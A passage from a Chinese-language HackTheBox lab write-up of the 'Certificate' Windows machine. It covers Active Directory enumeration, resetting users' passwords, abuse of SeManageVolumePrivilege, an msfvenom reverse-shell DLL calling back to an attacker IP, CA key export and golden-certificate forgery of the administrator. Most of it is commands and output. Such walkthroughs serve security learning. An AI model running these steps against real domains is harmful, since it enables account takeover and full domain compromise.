certificate.htb\\sara.b:Blink182\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ebloodhound-python\u003c/code\u003e 搜集信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'sara.b'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Blink182'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'certificate.htb'\u003c/span\u003e -ns 10.10.11.71 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC01.certificate.HTB'\u003c/span\u003e\nINFO: BloodHound.py \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: certificate.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC01.certificate.HTB\nINFO: Found 19 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 58 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WS-05.certificate.htb\nINFO: Querying computer: WS-01.certificate.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 20S\nINFO: Compressing output into 20250602223438_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现用户 \u003ccode\u003esara.b\u003c/code\u003e 是属于 \u003ccode\u003eREMOTE MANAGEMENT USERS\u003c/code\u003e组的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且是 \u003ccode\u003eAccount Operators\u003c/code\u003e组的用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那就是可以更改用户的密码、创建用户组等，但是不能直接修改 \u003ccode\u003eadmins\u003c/code\u003e 组用户的密码\u003c/p\u003e\n\u003cp\u003e查看一下 \u003ccode\u003eDomain Admins\u003c/code\u003e 组，只有 \u003ccode\u003eadministrator\u003c/code\u003e 用户一个，故无法直接获得域权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先使用 \u003ccode\u003esara.b\u003c/code\u003e 登录到 \u003ccode\u003eDC\u003c/code\u003e 进行信息收集\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate evil-winrm -i 10.10.11.71 -u \u003cspan class=\"hljs-string\"\u003e'sara.b'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Blink182'\u003c/span\u003e \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Sara.B\\Documents\u003e \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003eusers\u003c/code\u003e 文件夹，有好几个用户，先做好打算横向到哪一个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       12/30/2024   8:33 PM                Administrator\nd-----       11/23/2024   6:59 PM                akeder.kh\nd-----        11/4/2024  12:55 AM                Lion.SK\nd-r---        11/3/2024   1:05 AM                Public\nd-----        11/3/2024   7:26 PM                Ryan.K\nd-----         6/2/2025   8:17 AM                saad.m\nd-----       11/26/2024   4:12 PM                Sara.B\nd-----       12/29/2024   5:30 PM                xamppuser\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中最令人感兴趣的是 \u003ccode\u003eLION.SK\u003c/code\u003e 和 \u003ccode\u003eRYAN.K\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eLION.SK\u003c/code\u003e 属于\u003ccode\u003eDOMAIN CRA MANAGERS\u003c/code\u003e 该组解释是：该安全组的成员负责为域用户发行和撤销多个证书\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eRYAN.K\u003c/code\u003e 属于 \u003ccode\u003eDOMAIN STORAGE MANAGERS\u003c/code\u003e 改组解释是：该安全组的成员负责量级任务，例如维护，碎片部和管理分区和磁盘\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看一下俩用户权限\u003c/p\u003e\n\u003cp\u003e更改用户\u003ccode\u003eLION.SK\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate bloodyAD -d certificate.htb -u \u003cspan class=\"hljs-string\"\u003e'sara.b'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Blink182'\u003c/span\u003e --dc-ip 10.10.11.71 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password LION.SK \u003cspan class=\"hljs-string\"\u003e'Password123!!!'\u003c/span\u003e\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ccode\u003eLION.SK\u003c/code\u003e 用户家目录中能得到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Lion.SK\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n4c634600c2be9138b12e74ac6f288176\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e枚举用户权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e Enabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e更改用户\u003ccode\u003eRYAN.K\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate bloodyAD -d certificate.htb -u \u003cspan class=\"hljs-string\"\u003e'sara.b'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Blink182'\u003c/span\u003e --dc-ip 10.10.11.71 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password RYAN.K \u003cspan class=\"hljs-string\"\u003e'Password123!!!'\u003c/span\u003e\n[+] Password changed successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate evil-winrm -i 10.10.11.71 -u \u003cspan class=\"hljs-string\"\u003e'RYAN.K'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'Password123!!!'\u003c/span\u003e\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc\u003cspan class=\"hljs-string\"\u003e' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现 \u003ccode\u003eRYAN.K\u003c/code\u003e 用户有 \u003ccode\u003eSeManageVolumePrivilege\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ePRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                      State\n============================= ================================ =======\nSeMachineAccountPrivilege     Add workstations to domain       Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking         Enabled\nSeManageVolumePrivilege       Perform volume maintenance tasks Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e   Enabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eSeManageVolumePrivilege 滥用\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e找到一些利用文档和POC：\u003ca href=\"https://github.com/CsEnox/SeManageVolumeExploit\"\u003ehttps://github.com/CsEnox/SeManageVolumeExploit\u003c/a\u003e | \u003ca href=\"https://cn-sec.com/archives/3100947.html\"\u003ehttps://cn-sec.com/archives/3100947.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e改权限大致是让我们能拥有写入 \u003ccode\u003eC\u003c/code\u003e 盘的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e \u003e ../../../1.txt\nAccess to the path \u003cspan class=\"hljs-string\"\u003e'C:\\1.txt'\u003c/span\u003e is denied.\nAt line:1 char:1\n+ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e \u003e ../../../1.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e upload SeManageVolumeExploit.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\\Users\\Ryan.K\\Documents\\SeManageVolumeExploit.exe\n                                        \nData: 16384 bytes of 16384 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e ./SeManageVolumeExploit.exe\nEntries changed: 859\n\nDONE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功写入 \u003ccode\u003eC\u003c/code\u003e 盘\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e \u003e ../../../1.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eDLL hijack？\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ePOC\u003c/code\u003e链接中的\u003ccode\u003eDLL\u003c/code\u003e劫持无法使用，因为没有存在 \u003ccode\u003espool\u003c/code\u003e 文件夹\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\windows\\system32\u003e cmd /c \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e | findstr spoo\n11/26/2024  07:02 PM            93,184 spoolss.dll\n11/26/2024  07:03 PM           564,224 winspool.drv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是可以劫持别的\u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/xct/SeManageVolumeAbuse\"\u003ehttps://github.com/xct/SeManageVolumeAbuse\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e这里有别的\u003ccode\u003eDLL\u003c/code\u003e劫持方法，同时系统也存在该\u003ccode\u003eDLL\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\windows\\system32\\wbem\u003e cmd /c \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e | findstr tzres\n06/02/2025  09:33 AM             9,216 tzres.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected, selecting \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\nSaved as: tzres.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是最后 \u003ccode\u003esysteminfo\u003c/code\u003e \u003ccode\u003eAccess is denied\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\windows\\system32\\wbem\u003e systeminfo\nProgram \u003cspan class=\"hljs-string\"\u003e'systeminfo.exe'\u003c/span\u003e failed to run: Access is deniedAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~.\nAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCA.pfx\u003c/h3\u003e\n\u003cp\u003e佬们给出了另外一个方案，拥有\u003ccode\u003eSeManageVolumePrivilege\u003c/code\u003e 权限后可以通过\u003ccode\u003ecertuil\u003c/code\u003e 来导出证书\u003c/p\u003e\n\u003cp\u003e枚举\u003ccode\u003eCA\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate certipy-ad find -u sara.b -p \u003cspan class=\"hljs-string\"\u003e'Blink182'\u003c/span\u003e -dc-ip 10.10.11.71 -text\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e导出\u003ccode\u003eCA\u003c/code\u003e的证书\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e certutil -exportPFX my \u003cspan class=\"hljs-string\"\u003e\"Certificate-LTD-CA\"\u003c/span\u003e C:\\Users\\Public\\ca.pfx\nmy \u003cspan class=\"hljs-string\"\u003e\"Personal\"\u003c/span\u003e\n================ Certificate 2 ================\nSerial Number: 75b2f4bbf31f108945147b466131bdca\nIssuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb\n NotBefore: 11/3/2024 3:55 PM\n NotAfter: 11/3/2034 4:05 PM\nSubject: CN=Certificate-LTD-CA, DC=certificate, DC=htb\nCertificate Template Name (Certificate Type): CA\nCA Version: V0.0\nSignature matches Public Key\nRoot Certificate: Subject matches Issuer\nTemplate: CA, Root Certification Authority\nCert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8\n  Key Container = Certificate-LTD-CA\n  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958\n  Provider = Microsoft Software Key Storage Provider\nSignature \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e passed\nEnter new password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e output file C:\\Users\\Public\\ca.pfx:\nEnter new password:\nConfirm new password:\nCertUtil: -exportPFX \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents\u003e download ../../Public/ca.pfx\n                                        \nInfo: Downloading C:\\Users\\Ryan.K\\Documents\\../../Public/ca.pfx to ca.pfx\n                                        \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eCertUtil 会打开“my”证书存储（Personal/My），找到\u003cstrong\u003e主题名称 (Subject Name / Issued To)\u003c/strong\u003e 或**友好名称 (Friendly Name)**为“\u003ccode\u003eCertificate-LTD-CA\u003c/code\u003e”的那张证书\u003c/li\u003e\n\u003cli\u003e然后把这张证书及其私钥（以及可能的证书链）打包成一个 PFX 文件\u003c/li\u003e\n\u003cli\u003e最终会在 \u003ccode\u003eC:\\Users\\Public\\ca.pfx\u003c/code\u003e 位置生成一个二进制的 PFX 文件\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eGolden certificate\u003c/h3\u003e\n\u003cp\u003e拿到 \u003ccode\u003eca.pfx\u003c/code\u003e 的证书公私钥后可以进行黄金证书（Golden certificate）攻击\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate\"\u003ehttps://www.thehacker.recipes/ad/persistence/adcs/golden-certificate\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e伪造\u003ccode\u003eadministrator\u003c/code\u003e 的证书\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject \u003cspan class=\"hljs-string\"\u003e'CN=Administrator,CN=Users,DC=certificate,DC=htb'\u003c/span\u003e -out administrator_forge.pfx\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Saving forged certificate and private key to \u003cspan class=\"hljs-string\"\u003e'administrator_forge.pfx'\u003c/span\u003e\n[*] Wrote forged certificate and private key to \u003cspan class=\"hljs-string\"\u003e'administrator_forge.pfx'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用证书获取\u003ccode\u003eTGT\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: \u003cspan class=\"hljs-string\"\u003e'administrator@certificate.htb'\u003c/span\u003e\n[*] Using principal: \u003cspan class=\"hljs-string\"\u003e'administrator@certificate.htb'\u003c/span\u003e\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to \u003cspan class=\"hljs-string\"\u003e'administrator.ccache'\u003c/span\u003e\n[*] Wrote credential cache to \u003cspan class=\"hljs-string\"\u003e'administrator.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'administrator@certificate.htb'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\n7d69ba1c8bb2ee23ff27f0e1610caa3b\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e任重道远，不会的还是多…比如利用\u003ccode\u003ecertutil\u003c/code\u003e来导出证书这一点，以及文件上传的\u003ccode\u003eZipSlip\u003c/code\u003e ，总的也是学习到了新东西\u003c/p\u003e","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","updated":"2025-10-13","tags":["HackTheBox","Windows","ADCS","GoldenCertificate","seManageVolumePrivilegem","ZipSlip"],"categories":"靶机","comments":true,"description":"Season8 - Certificate\n\n https://app.hackthebox.com/machines/Certificate | `Windows` | `Hard`\n \n\n前期踩点\n\n\n\n\n\n刚刚尝试了`SMB`无法使用匿名账户进行访问，因为还扫描到了`80`端口，所以从`Web`下手\n\nWeb\n\n访问 `HTTP` 并采集指纹\n\n\n\n其中还有登录页和注册页\n\n\n\n创建了一个账..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackTheBoxSeason8 - Certificate"},"buildId":"zhUbpfrrtSfTpjx7rkQnM","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>